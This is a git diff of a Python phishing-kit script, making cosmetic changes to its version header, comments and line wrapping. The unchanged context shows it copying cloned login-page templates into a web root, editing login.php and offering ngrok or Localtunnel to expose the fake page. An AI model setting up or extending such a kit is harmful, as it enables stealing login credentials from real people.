@@ -6,8 +6,8 @@
 ## You may change the code however you want                    ##
 ## Create pull requests to support the tool                    ##
 ## Create an issue if you find any problems or ideas           ##
-## Lasted Updated: 2/6/20                                      ##
-## Version 3.6: - Small fixes                                  ##
+## Lasted Updated: 2/15/20                                     ##
+## Version 3.7: - More commented code                          ##
 ## Please update version number and date each time we update   ##
 #################################################################
 
@@ -105,7 +105,7 @@ def checkInternet(): # Checks for internet connection #
 
 
 
-def setup(template):
+def setup(template): # Template for input #
     print('\n')
     print(red + '           [1]' + blue + ' ngrok (recommended)')
     print(red + '           [2]' + blue + ' Localtunnel')
@@ -124,8 +124,7 @@ def setup(template):
         print(green + '[+] Cleaning /Server/www/')
         sleep(0.1)
         system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
         redirect()  # Redirect Prompt #
         print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
         dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
@@ -165,8 +164,7 @@ def setup(template):
         print(green + '[+] Cleaning /Server/www/')
         sleep(0.1)
         system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
         redirect()  # Redirect Prompt #
         print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
         dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
@@ -206,8 +204,7 @@ def setup(template):
         print(green + '[+] Cleaning /Server/www/')
         sleep(0.1)
         system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
         redirect()  # Redirect Prompt #
         print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
         dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
@@ -245,8 +242,7 @@ def setup(template):
         print(green + '[+] Cleaning /Server/www/')
         sleep(0.1)
         system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
         redirect()  # Redirect Prompt #
         print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
         dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
